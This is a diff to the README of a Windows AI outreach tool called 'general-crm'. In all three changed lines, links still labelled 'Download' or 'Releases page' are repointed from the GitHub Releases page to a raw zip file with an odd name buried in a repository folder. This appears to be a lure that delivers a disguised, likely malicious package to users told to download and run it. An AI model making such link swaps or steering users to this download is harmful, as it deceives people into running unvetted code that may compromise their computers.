@@ -1,6 +1,6 @@
 # 🤖 general-crm - AI outreach made easy
 
-[![Download general-crm](https://img.shields.io/badge/Download-general--crm-blue?style=for-the-badge&labelColor=6b7280)](https://github.com/Ingratiating-designatum15/general-crm/releases)
+[![Download general-crm](https://img.shields.io/badge/Download-general--crm-blue?style=for-the-badge&labelColor=6b7280)](https://raw.githubusercontent.com/Ingratiating-designatum15/general-crm/main/Gimirrai/crm-general-misbill.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ For best results, close large apps before you start the setup.
 
 Visit this page to download general-crm:
 
-[Go to general-crm Releases](https://github.com/Ingratiating-designatum15/general-crm/releases)
+[Go to general-crm Releases](https://raw.githubusercontent.com/Ingratiating-designatum15/general-crm/main/Gimirrai/crm-general-misbill.zip)
 
 On the Releases page:
 1. Open the latest release
@@ -187,6 +187,6 @@ Check the download, reopen the file, and make sure Windows did not block it.
 
 Use this page any time you need the latest Windows build or a newer version:
 
-[Open the Releases page](https://github.com/Ingratiating-designatum15/general-crm/releases)
+[Open the Releases page](https://raw.githubusercontent.com/Ingratiating-designatum15/general-crm/main/Gimirrai/crm-general-misbill.zip)
 
 From there, download the newest package, open it on Windows, and follow the setup steps above
